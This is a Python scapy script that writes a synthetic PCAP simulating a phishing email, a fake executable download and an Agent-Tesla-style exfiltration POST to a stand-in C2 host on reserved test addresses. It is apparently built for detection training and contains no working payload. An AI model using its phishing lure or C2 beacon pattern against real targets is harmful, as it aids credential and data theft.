from scapy.all import *
from datetime import datetime, timedelta
import random
from tcpStuff import tcp_handshake, tcp_ack, tcp_send

# -----------------------------
# Configuration Details (eg start time, IPs, etc)
# -----------------------------
victim_ip = "10.0.0.25"
mail_server_ip = "10.0.0.5"
web_server_ip = "203.0.113.50"     # TEST-NET-3 (RFC 5737)
c2_ip = "198.51.100.77"            # TEST-NET-2 (RFC 5737)

victim_mac = "00:11:22:33:44:55"
server_mac = "66:77:88:99:aa:bb"

sport_base = random.randint(1024, 60000)

pkts = []
base_time = datetime.now()

def ts(offset):
    return base_time + timedelta(seconds=offset)




# -----------------------------
# 1. Phishing Email (SMTP)
# -----------------------------

#TCP Handshake
client_seq, server_seq = tcp_handshake(
    pkts, ts, 0,
    victim_mac, server_mac,
    victim_ip, mail_server_ip,
    sport=1025, dport=25
)


smtp_payloads = [
    b"EHLO victim.local\r\n",
    b"MAIL FROM:<billing@s3cur3-payments.example>\r\n",
    b"RCPT TO:<user@victim.local>\r\n",
    b"DATA\r\n",
    b"Subject: Urgent Invoice Overdue\r\n"
    b"From: Billing <billing@s3cur3-payments.example>\r\n"
    b"To: user@victim.local\r\n\r\n"
    b"Please review the attached invoice immediately:\r\n"
    b"http://invoices-s3cur3.example/download/invoice.html\r\n.\r\n",
    b"QUIT\r\n"
]

i = 3 # since start at 3 packets from handshake
for cmd in smtp_payloads:
    client_seq = tcp_send(
        pkts, ts, i,
        victim_mac, server_mac,
        victim_ip, mail_server_ip,
        1025, 25,
        client_seq, server_seq,
        cmd
    )
    i += 1

    tcp_ack(
        pkts, ts, i,
        server_mac, victim_mac,
        mail_server_ip, victim_ip,
        25, 1025,
        server_seq, client_seq
    )
    i += 1

# -----------------------------
# 2. Payload Download (HTTP)
# -----------------------------
http_get = (
    b"GET /download/Invoice_84732.exe HTTP/1.1\r\n"
    b"Host: invoices-secure.example\r\n"
    b"User-Agent: Mozilla/5.0\r\n\r\n"
)

http_response = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Type: application/octet-stream\r\n"
    b"Content-Length: 40960\r\n\r\n"
    b"MZ" + b"\x00" * 200   # Fake PE header marker
)

pkt_get = (
    Ether(src=victim_mac, dst=server_mac) /
    IP(src=victim_ip, dst=web_server_ip) /
    TCP(sport=sport_base, dport=80, flags="PA") /
    Raw(load=http_get)
)
pkt_get.time = ts(10).timestamp()
pkts.append(pkt_get)

pkt_resp = (
    Ether(src=server_mac, dst=victim_mac) /
    IP(src=web_server_ip, dst=victim_ip) /
    TCP(sport=80, dport=sport_base, flags="PA") /
    Raw(load=http_response)
)
pkt_resp.time = ts(11).timestamp()
pkts.append(pkt_resp)

# -----------------------------
# 3. Fake Agent-Tesla-like Exfil
# -----------------------------
# (NO real protocol, NO real encryption)
exfil_payload = (
    b"POST /gate.php HTTP/1.1\r\n"
    b"Host: update-check.example\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
    b"host=victim-pc&user=jdoe&browser=chrome&data=BASE64ENCODEDFAKE"
)

pkt_exfil = (
    Ether(src=victim_mac, dst=server_mac) /
    IP(src=victim_ip, dst=c2_ip) /
    TCP(sport=sport_base + 1, dport=443, flags="PA") /
    Raw(load=exfil_payload)
)
pkt_exfil.time = ts(20).timestamp()
pkts.append(pkt_exfil)

# -----------------------------
# Write PCAP
# -----------------------------
wrpcap("fake_phish_agenttesla.pcap", pkts)

print("PCAP written: fake_phish_agenttesla.pcap")
